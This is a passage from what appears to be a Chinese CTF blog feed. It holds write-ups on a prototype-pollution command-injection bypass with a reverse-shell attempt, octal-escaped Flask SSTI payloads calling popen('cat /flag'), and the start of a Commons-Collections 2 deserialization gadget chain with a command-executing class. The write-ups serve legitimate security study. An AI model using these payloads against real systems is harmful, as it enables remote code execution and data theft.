class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">flag1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag)/<span class="number">8</span>) <span class="comment">#84</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">84</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    str1 = flag[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">    x = <span class="built_in">chr</span>(<span class="built_in">int</span>(str1,<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    flag1 += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">51</span>))</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221112160053571.png" alt="image-20221112160053571"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://mp.weixin.qq.com/s/kACnYYwJWycT53BxrWjoxQ">官方WP（一）｜“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛 (qq.com)</a></li><li><a href="https://mp.weixin.qq.com/s/RhhexVTr0ZRp6eek78QfHA">官方WP（二）｜“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛 (qq.com)</a></li><li><a href="https://mouse0w0.github.io/2018/12/02/Introduction-to-Nashorn/">介绍 Nashorn —— Java 8 JavaScript 引擎 | 耗子的博客 (mouse0w0.github.io)</a></li><li><a href="https://www.freebuf.com/articles/web/290668.html">JWT攻击常用的两种算法 - FreeBuf网络安全行业门户</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QLExpress </tag>
            
            <tag> JWT </tag>
            
            <tag> 密钥混淆攻击 </tag>
            
            <tag> nodemon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届强网拟态防御国际精英挑战赛</title>
      <link href="/2022/11/07/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/11/07/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WHOYOUARE"><a href="#WHOYOUARE" class="headerlink" title="WHOYOUARE"></a>WHOYOUARE</h1><p>主要看了这个题目，popsql和ezus学弟直接K了</p><p>题目给了附件，看关键代码，对传入的<code>user.command</code>进行检查，然后通过merge将user复制给request.user，然后通过<code>ChildProcess.execFile</code>执行request.user.command</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221107153308686.png" alt="image-20221107153308686"></p><p>所以我们需要赋值command为恶意命令，主要看两个函数，checkuser和merge</p><h2 id="checkUser"><a href="#checkUser" class="headerlink" title="checkUser"></a>checkUser</h2><p>checkUser函数如下，首先是command需要时一个数组，长度小于等于2，并且字符串长度不能超过4，只能含有<code>a-zA-Z0-9-</code>以内的字符串(包括<code>-i  -c</code>这样的字符串)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">command</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(command) === <span class="literal">false</span> || command.<span class="property">length</span> &gt; <span class="number">2</span>) &#123;   <span class="comment">// 需要为数组，且长度小于等于2</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;不是数组&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; command.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd = command[i];   </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> cmd !== <span class="string">&#x27;string&#x27;</span> || cmd.<span class="property">length</span> &gt; <span class="number">4</span> || <span class="title class_">RegExp</span>(<span class="regexp">/^[^a-zA-Z0-9-]+$/</span>).<span class="title function_">test</span>(command[i])) &#123; <span class="comment">//不能有特殊字符  a-z A-Z 0-9-是可用字符</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h2><p>其实看merge这个函数名，八九不离十就有原型链污染</p><p>这里对键名添加了白名单限制，并且还过滤了<code>__proto__</code>，但是可以通过<code>constructor.prototype</code>绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> whileTypes = [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key+<span class="string">&quot;类型是&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> target[key]))&#123; <span class="comment">// 不在白名单中</span></span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = merge</span><br></pre></td></tr></table></figure><p>本地实践，可以污染任意一个属性，比如b&#x3D;2，测试代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// let source = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;);</span></span><br><span class="line"><span class="type">let</span> <span class="variable">source</span> <span class="operator">=</span> JSON.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">whileTypes</span> <span class="operator">=</span> [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">merge</span> <span class="operator">=</span> (target, source) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (const key in source) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!whileTypes.includes(typeof source[key]) &amp;&amp; !whileTypes.includes(typeof target[key]))&#123; <span class="comment">// 不在白名单中</span></span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                merge(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// merge(target,source)</span></span><br><span class="line"><span class="comment">// console.log(target)</span></span><br><span class="line"><span class="comment">// console.log(target.a, target.b)</span></span><br><span class="line"><span class="comment">// console.log(source)</span></span><br><span class="line"><span class="comment">// console.log(&quot;11111111&quot;)</span></span><br><span class="line"><span class="comment">// o3 = &#123;&#125;</span></span><br><span class="line"><span class="comment">// console.log(o3.b)</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/9299146e-03d1-407f-acff-5d2e7d08e42d.png" alt="9299146e-03d1-407f-acff-5d2e7d08e42d"></p><p>发现可以执行在不违背waf的情况下，可以执行一些简短的命令</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">68</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;username\&quot; : \&quot;111\&quot;, \&quot;command\&quot;: [\&quot;-c\&quot;, \&quot;ls /\&quot;]&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/output.png" alt="output"></p><p>这时候发现代码实际执行的时候，其实就是<code>/bin/bash -c ls /</code>，<code>bin</code>在前面被定义为<code>/bin/bash</code>，本地环境测试的时候，改为<code>cmd.exe</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221107154322968.png" alt="image-20221107154322968"></p><p>在本地测试的时候，发现原型链污染的数据会添加在command数组后，是因为merge合并的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;username\&quot; : \&quot;111\&quot;,\&quot;constructor\&quot;:&#123;\&quot;prototype\&quot;: &#123;\&quot;command\&quot;: \&quot;whoami\&quot;&#125;&#125;,\&quot;command\&quot;:[\&quot;/c\&quot;,\&quot;dir\&quot;]&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/asynccode.png" alt="img"></p><p>只要将对应的值改为2，那么就会在command数组行添加<code>2-&gt;C:</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/c3f5b25a-0b04-4083-a7da-a6dbf2519a88-1667807415331-4.png" alt="c3f5b25a-0b04-4083-a7da-a6dbf2519a88"></p><p>本地可以成功，如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">112</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;username\&quot; : \&quot;111\&quot;,\&quot;constructor\&quot;:&#123;\&quot;prototype\&quot;: &#123;\&quot;2\&quot;:\&quot;D:\&quot;&#125;&#125;,\&quot;command\&quot;:[\&quot;/c\&quot;,\&quot;dir\&quot;]&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/7f9b007b-e9bb-4951-90f1-193685fa6503.png" alt="7f9b007b-e9bb-4951-90f1-193685fa6503"></p><p>但是因为linux和windows执行命令上的区别，，长度不能超过4，<code>而bin/bash -c &quot;cmd&quot;需要引号</code>，但特殊符号只有<code>-</code>可以用</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221107155920628.png" alt="image-20221107155920628"></p><p>本来想<code>bin/bash -c bash -i</code>反弹shell的，靶机为内网环境没成功</p><p>后来发现，把bash去掉，直接拼接 <code>-c -i</code> 就可以了</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/a8465c81-feae-42a3-9e34-84b856de7525.png" alt="a8465c81-feae-42a3-9e34-84b856de7525"></p><h1 id="没有人比我更懂py"><a href="#没有人比我更懂py" class="headerlink" title="没有人比我更懂py"></a>没有人比我更懂py</h1><p>记录一下<code>无字母SSTI</code></p><p><a href="http://diego.team/2020/05/20/Flask-SSTI/">Flask ssti - Diego | BY Blog</a></p><p><a href="https://github.com/zxhyo/zxhyo.github.io/blob/22c16067a9f293fc8bf35c3502f8ec39d2da3bcf/2021/12/20/Flask-ssti%E6%80%BB%E7%BB%93/index.html">zxhyo.github.io&#x2F;index.html at 22c16067a9f293fc8bf35c3502f8ec39d2da3bcf · zxhyo&#x2F;zxhyo.github.io</a></p><p>8进制绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">&quot;__class__&quot;</span></span><br><span class="line">dicc = []</span><br><span class="line">exploit = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;dicc.append(&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;\\&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">    exploit += <span class="string">&quot;\\&quot;</span>+ <span class="built_in">str</span>(dicc.index(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exploit)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]&#125;&#125;</span><br><span class="line">回显：</span><br><span class="line">&amp;lt;<span class="keyword">class</span> &amp;<span class="comment">#39;list&amp;#39;&amp;gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;[][<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>]&#125;&#125;</span><br><span class="line">回显：&amp;amp;lt;<span class="keyword">class</span> &amp;amp;<span class="comment">#39;object&amp;amp;#39;&amp;amp;gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;[][<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/d9981991-64f6-4025-a93a-67d968b99d10.png" alt="d9981991-64f6-4025-a93a-67d968b99d10"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os._wrap_close</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">&#123;&#123;[][<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()[<span class="number">132</span>][<span class="string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>][<span class="string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>][<span class="string">&#x27;\160\157\160\145\156&#x27;</span>](<span class="string">&#x27;\154\163&#x27;</span>)[<span class="string">&#x27;\162\145\141\144&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/f22af98b-fa54-4cf9-9c21-43733bfbdfde.png" alt="f22af98b-fa54-4cf9-9c21-43733bfbdfde"></p><p>cat &#x2F;flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()[<span class="number">132</span>][<span class="string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>][<span class="string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>][<span class="string">&#x27;\160\157\160\145\156&#x27;</span>](<span class="string">&#x27;\143\141\164\40\57\146\154\141\147&#x27;</span>)[<span class="string">&#x27;\162\145\141\144&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/63cd0950-0115-4579-b7cf-4dc5049782a3.png" alt="63cd0950-0115-4579-b7cf-4dc5049782a3"></p><h1 id="web-mimic"><a href="#web-mimic" class="headerlink" title="web_mimic"></a>web_mimic</h1><p>记录下这个题目</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/fea1d20c-b4a8-4fcc-b840-5326c87360f0.png" alt="fea1d20c-b4a8-4fcc-b840-5326c87360f0"></p><p>md5解密，得到123</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/55b86568-8f35-4b07-b154-d2b192e7f2de.png" alt="55b86568-8f35-4b07-b154-d2b192e7f2de"></p><p>进行DES解密</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/2d2d8262-9a80-4b8c-8527-d468b9dfd828.png" alt="2d2d8262-9a80-4b8c-8527-d468b9dfd828"></p><p>得到</p><blockquote><p> 1.maybe used first url get random:</p><p>&#x2F;mimic_storage</p><p>2.maybe used second url get flag:</p><p>&#x2F;getflag?sec&#x3D;random&amp;path&#x3D;xxxx</p><p>xxx is:</p><p>bAzlsD1ChiFW5eMC5tUokHErPkdjqARE</p></blockquote><p>第一步访问&#x2F;mimic_storage获得随机数1275589079</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/74e3704f-74d0-4673-a40d-22ec7084c1c7.png" alt="74e3704f-74d0-4673-a40d-22ec7084c1c7"></p><p>第二步，填上对应的sec和path，获得flag</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/6dfb68e5-8cec-4ac3-af54-13853a1be3c1.png" alt="6dfb68e5-8cec-4ac3-af54-13853a1be3c1"></p><p>有进步，继续加油学(ง •_•)ง</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
            <tag> 强网拟态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cc2分析</title>
      <link href="/2022/11/02/cc2%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/02/cc2%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>看到commons-collections-4.0以上版本，直接想cc2这个链子</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>jdk1.8</p><p>commons-collections-4.0</p><p>javassist（在靶机环境中不需要有javassist，只是我们生成恶意payload的过程中需要javassist动态类编程）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.12</span><span class="number">.1</span>.GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="为什么不能用commons-collections-3-1-3-2"><a href="#为什么不能用commons-collections-3-1-3-2" class="headerlink" title="为什么不能用commons-collections-3.1-3.2"></a>为什么不能用commons-collections-3.1-3.2</h3><p>在3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。</p><p>并且也采取了一下新的利用类PriorityQueue 和 TransformingComparator。通过 PriorityQueue 做为入口点，TransformingComparator 作为跳板去触发利用链。</p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>其中一些细节没有加上，比如PriorityQueue类内部的一些方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">            TemplatesImpl.newTransformer</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="javassist动态编程"><a href="#javassist动态编程" class="headerlink" title="javassist动态编程"></a>javassist动态编程</h3><p><a href="https://sk1y233.github.io/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/">Javassist动态编程 | Sk1y’s Blog (sk1y233.github.io)</a></p><h2 id="cc2分析"><a href="#cc2分析" class="headerlink" title="cc2分析"></a>cc2分析</h2><h3 id="被调用类"><a href="#被调用类" class="headerlink" title="被调用类"></a>被调用类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;<span class="comment">//calc1.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc1</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h3><p>这条链的最终执行命令的地方是TemplatesImpl执行字节码，TemplatesImpl类内的链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">    TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">        TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">            TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><p>然后看谁调用了newTransformer()</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102101049376.png" alt="image-20221102101049376"></p><p>对应的代码，获取恶意类字节码，并且赋值给<code>_bytecodes</code>，同时需要给<code>_name</code>赋值任意字符串，满足过程中的判断条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">// 第一部分：使用ClassPool获取恶意类的字节码，恶意类中静态代码块就是我们可以执行的命令</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;Rome.calc1&quot;</span>);     <span class="comment">//弹计算器</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.getCtClass(&quot;cc2.Evil&quot;);      //不出网</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">     